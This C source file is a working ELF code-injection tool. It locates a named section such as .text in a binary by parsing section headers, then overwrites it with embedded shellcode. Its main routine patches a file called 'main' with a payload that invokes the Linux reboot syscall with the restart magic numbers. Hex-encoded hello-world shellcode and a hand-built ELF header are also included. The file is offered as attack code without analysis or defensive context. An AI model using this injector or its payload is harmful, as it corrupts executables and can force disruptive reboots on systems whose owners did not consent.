#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>

#define SHOFF 0x28
#define SHNUM 0x3C
#define SHSTRINX 0x3E
#define SHENTSIZE 0x3A

const char reboot[] = "\xBF\xAD\xDE\xE1\xFE\xBE\x69\x19\x12\x28\xBA\x67\x45\x23\x01\x45\x31\xD2\xB8\xA9\x00\x00\x00\x0F\x05";

const char  ELF_h[]  = "\x7F\x45\x4C\x46\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x3E\x00\x01\x00\x00\x00\x78\x00\x40\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x38\x00\x01\x00\x00\x00\x00\x00\x00\x00";

const char program_header[] = "\x01\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\xA4\x00\x00\x00\x00\x00\x00\x00\xA4\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00";

const char Hello_word[]  = "\xB8\x01\x00\x00\x00\xBF\x01\x00\x00\x00\x48\x8D\x35\x10\x00\x00\x00\xBA\x0D\x00\x00\x00\x0F\x05\xB8\x3C\x00\x00\x00\x31\xFF\x0F\x05helloworld\n";


int inject_instruction(char *target,char *section_to_inject, char *instruction,int inst_size)
{

	int flag = S_IRWXU | S_IRWXO; 
	int fd = open(target,O_RDONLY,flag);
	if(fd == -1) return -1;

	off_t size = lseek(fd,0,SEEK_END);
	if(size == -1){
		close(fd);
		return -1;
	}

	if(lseek(fd,0,SEEK_SET) == -1){
		close(fd);
		return -1;
	}

	
	unsigned char cpy[size+1];
	memset(cpy,0,size+1);

	if(read(fd,cpy,size) == -1){
		close(fd);
		return -1;
	}

	close(fd);
	fd = -1;
	/*here we have the target program in memory*/
	
	/*FIND the section_to_inject  offset in the file(program)*/	
	
	off_t section_header_start = 0;
	memcpy(&section_header_start,&cpy[SHOFF],sizeof(off_t));

	uint16_t sh_num = 0;
	memcpy(&sh_num,&cpy[SHNUM],sizeof(uint16_t));

	uint16_t str_symbol_index = 0 ;
	memcpy(&str_symbol_index,&cpy[SHSTRINX],sizeof(uint16_t));

	unsigned char sh_strsym[65] = {0};
	off_t str_symbol_table_data_off = section_header_start + (str_symbol_index * 64);
	memcpy(sh_strsym,&cpy[str_symbol_table_data_off],64);
	
	off_t sh_strtbl_off = 0;	
	size_t sh_strtbl_sz = 0;
	memcpy(&sh_strtbl_off,&sh_strsym[0x18],8);
	memcpy(&sh_strtbl_sz,&sh_strsym[0x20],8);
	
	unsigned char strtbl[sh_strtbl_sz+1];
	memset(strtbl,0,sh_strtbl_sz+1);
	memcpy(strtbl,&cpy[sh_strtbl_off],sh_strtbl_sz);
	
	/*read section header to understand where to inject the code
		 you can inject in .init or .text sections */

	int i = 0;
	ssize_t bread = section_header_start;
	off_t offset = 0;
	while(i < sh_num){
		uint32_t sh_name = 0;	
		memcpy(&sh_name,&cpy[bread],sizeof(uint32_t));
		if(!sh_name){
			bread += 64;
			i++;
			continue;
		}

		if(strncmp(section_to_inject,&strtbl[sh_name],strlen(section_to_inject)) == 0){
			memcpy(&offset,&cpy[bread+0x18],sizeof(off_t));
			if(offset) break;
		}
		bread += 64;
		i++;
		continue;
	}	
	fd = open(target,O_WRONLY,flag);
	if(fd == -1){
		printf("cannot create the program\n");
		return 0;
	}

	if(lseek(fd,offset,SEEK_SET) == -1){
		close(fd);
		return 1;
	}

	/*INJECTION*/
	int r = write(fd,instruction,inst_size);
	close(fd);

	if(r == -1) return -1;
	return 0;
}


int main(){

	int r = inject_instruction("main",".text",(char*)reboot,sizeof(reboot)-1);
	if(r == -1) return -1;
	return 0;
}
